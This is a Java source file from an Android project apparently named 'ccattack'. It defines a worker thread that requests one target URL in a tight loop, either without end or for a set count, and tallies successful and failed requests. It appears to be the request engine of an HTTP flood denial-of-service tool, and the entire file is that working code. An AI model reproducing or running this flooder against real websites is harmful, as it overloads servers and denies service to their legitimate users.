package moe.bsod.ccattack;

import android.util.Log;

import java.io.FileNotFoundException;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;

/**
 * Created by anthony on 10/11/17.
 */

public class ClientBrowser extends Thread {

	private URL urlreq;

	private long req_count = 0;
	private long fail_count = 0;

	private Object runningLock;

	private int loop_count = -1;

	public byte[] buf;

	private boolean threadAlive = true;

	public ClientBrowser(String url) throws MalformedURLException {
		urlreq = new URL(url);
		buf = new byte[4096];
		runningLock = new Object();
	}

	public ClientBrowser(String url, int loop_count) throws MalformedURLException {
		this.loop_count = loop_count == 0 ? -1 : loop_count;
		urlreq = new URL(url);
		buf = new byte[4096];
		runningLock = new Object();
	}

	public long getReq_count() {
		return req_count;
	}

	public long getFail_count() {
		return fail_count;
	}

	public void terminate() {
		threadAlive = false;
		this.interrupt();
	}

	public boolean isTerminate() {
		return threadAlive;
	}

	@Override
	public void run() {
		synchronized (runningLock) {
			while (threadAlive && (loop_count < 0 ? true : loop_count --> 0)) {

				try {
					URLConnection conn = urlreq.openConnection();
					conn.setDoInput(true);
					conn.setConnectTimeout(3000);
					conn.setReadTimeout(3000);
					conn.getInputStream().read(buf);
					req_count++;
				} catch (FileNotFoundException e) {
					req_count++;
				} catch (IOException e) {
					fail_count++;
					e.printStackTrace();
				}
			}
			threadAlive = false;
		}
	}
}
